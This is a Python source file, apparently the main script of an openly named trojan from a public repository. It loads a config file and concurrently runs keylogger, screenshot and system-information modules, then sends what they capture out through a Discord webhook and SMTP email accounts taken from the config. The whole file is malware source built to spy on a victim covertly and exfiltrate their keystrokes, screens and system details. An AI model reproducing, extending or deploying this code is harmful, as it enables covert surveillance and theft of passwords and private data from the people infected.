#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

from concurrent.futures import ThreadPoolExecutor
from configparser import ConfigParser
from pathlib import Path

from src.modules.exfiltration import Discord, Email
from src.modules.exploitation import KeyLogger, ScreenShot, SystemInformation


class ConfigFile:
    def __init__(self):
        self.cfg = ConfigParser()
        self.cfg.read(Path(__file__).parent.joinpath("trojan.cfg"))
        self.setup = self.cfg["Setup"]
        self.discord = self.cfg["Discord"]
        self.email = self.cfg["Email"]


class Trojan(object):
    def __init__(self):
        self.cfg = ConfigFile()

    @property
    def modules(self):
        return {
            KeyLogger(exfil_time=self.cfg.setup.getint("ExfiltrationTime")),
            ScreenShot(image_path=self.cfg.setup["ScreenshotFile"],
                       exfil_time=self.cfg.setup.getint("ExfiltrationTime")),
            SystemInformation()
        }

    def execute(self):
        with ThreadPoolExecutor() as executor:
            for module in self.modules:
                Discord(module=module,
                        webhook_url=self.cfg.discord["Webhook"])
                Email(module=module,
                      smtp_host=self.cfg.email["Host"],
                      smtp_port=self.cfg.email.getint("Port"),
                      email=self.cfg.email["Username"],
                      password=self.cfg.email["Password"])
                executor.submit(module.execute)


if __name__ == "__main__":
    (trojan := Trojan()).execute()
